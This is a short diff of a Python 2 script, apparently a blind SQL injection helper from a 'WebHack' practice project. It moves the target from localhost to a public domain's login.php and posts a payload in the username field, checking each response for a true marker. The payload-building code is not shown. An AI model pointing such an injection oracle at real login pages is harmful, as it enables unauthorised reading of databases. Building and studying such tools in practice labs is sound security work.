@@ -4,7 +4,7 @@ import requests
 import sys
 
 # Input the URL running the .php file that connects to db
-BASEURL = "http://localhost/WebHack/php/login.php"
+BASEURL = "http://frechetta.me/WebHack/php/login.php"
 
 SESSION = requests.Session()
 
@@ -23,5 +23,6 @@ def evaluateSQL(cond):
     response = postURL(BASEURL, {"username": payload, "passname": " "})
     print response
     return TRUE in response
+
 
 print evaluateSQL(sys.argv[1])
